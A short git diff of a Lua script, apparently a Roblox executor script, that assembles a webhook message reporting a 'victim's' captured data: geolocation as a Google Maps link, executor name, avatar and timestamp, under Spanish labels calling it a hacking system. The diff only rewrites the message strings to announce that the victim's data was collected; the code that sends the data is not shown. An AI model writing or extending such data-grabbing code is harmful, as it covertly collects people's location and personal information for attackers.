@@ -88,9 +88,9 @@ local executorName = identifyexecutor and identifyexecutor() or "Desconocido"
 local googleMapsLink = (latVal and lonVal) and "[Ver ubicación](https://www.google.com/maps?q="..latVal..","..lonVal..")" or "N/A"
 
 local data = {
-    ["username"] = "⚠️ ALERTA VIP INFO HACKING",
+    ["username"] = "🕵🏻Reporting data victim",
     ["avatar_url"] = avatarUrl,
-    ["content"] = "**⚠️ Ejecución detectada, prepárate para recoger el hit 🚨**",
+    ["content"] = "**💪 Ejecución detectada, datos de la victima recopilados ✅**",
     ["embeds"] = {{
         ["description"] = "Información capturada automáticamente con el mejor sistema hacking:",
         ["color"] = 16729344,
@@ -108,7 +108,7 @@ local data = {
             {["name"]="🔗 Ubicación", ["value"]=googleMapsLink, ["inline"]=false},
             {["name"]="🛠️ Executor", ["value"]=executorName, ["inline"]=true},
             {["name"]="⏰ Hora", ["value"]=os.date("%Y-%m-%d %H:%M:%S"), ["inline"]=false},
-            {["name"]="💥 Estado", ["value"]="Preparando todo para el hit, mantente atento!", ["inline"]=false}
+            {["name"]="💥 Estado", ["value"]="Se recopilo Todos los datos correctamente ✅", ["inline"]=false}
         },
         ["footer"] = {["text"] = "Sistema de ejecución hacking • " .. os.date("%d/%m/%Y")}
     }}
